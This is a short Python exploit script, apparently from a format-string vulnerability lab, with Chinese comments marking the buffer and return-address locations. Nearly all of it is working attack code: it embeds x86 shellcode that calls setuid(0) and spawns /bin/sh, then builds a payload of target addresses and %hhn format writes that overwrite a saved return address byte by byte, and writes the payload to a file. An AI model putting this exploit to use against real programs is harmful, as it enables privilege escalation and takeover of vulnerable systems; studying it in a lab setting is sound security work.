#!/usr/bin/env python3

# This shellcode creates a local shell
local_shellcode= (
  "\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"
  "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50"
  "\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00"
).encode('latin-1')

# 缓冲区地址
str_addr = 0xffffcee4

shellcode_addr = str_addr + 100

# 返回地址在栈中的地址
ret_addr = 0xffffcec8 + 4

payload = b''
num_char = 0

payload += (ret_addr+0).to_bytes(4, 'little')
payload += (ret_addr+1).to_bytes(4, 'little')
payload += (ret_addr+2).to_bytes(4, 'little')
payload += (ret_addr+3).to_bytes(4, 'little')
num_char = 16

inc = (0x100 + ((shellcode_addr >> 0) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%17$hhn'

inc = (0x100 + ((shellcode_addr >> 8) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%18$hhn'

inc = (0x100 + ((shellcode_addr >> 16) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%19$hhn'

inc = (0x100 + ((shellcode_addr >> 24) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%20$hhn'

payload += b'a' * (100 - len(payload))
payload += local_shellcode

with open("input", "wb") as f:
    f.write(payload)
